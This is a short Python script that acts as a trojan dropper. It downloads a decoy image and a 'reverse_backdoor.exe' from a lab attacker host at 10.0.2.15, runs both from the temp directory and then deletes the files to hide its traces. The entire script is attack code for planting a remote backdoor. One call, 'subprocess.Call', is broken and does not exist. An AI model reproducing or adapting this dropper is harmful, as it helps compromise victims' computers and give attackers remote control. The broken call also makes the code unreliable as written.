#!/usr/bin/env python

import requests
import subprocess
import os
import tempfile


def download(url):
    response = requests.get(url)
    with open(url.split("/")[-1], "wb") as out_file:
        out_file.write(response.content)


tmp_dir = tempfile.gettempdir()
os.chdir(tmp_dir)

download("http://10.0.2.15/evil-files/car.jpg")
command = "car.jpg"
result = subprocess.Popen(command, shell=True)

download("http://10.0.2.15/evil-files/reverse_backdoor.exe")
command = "reverse_backdoor.exe"
result = subprocess.Call(command, shell=True)

os.remove("car.jpg")
os.remove("reverse_backdoor.exe")
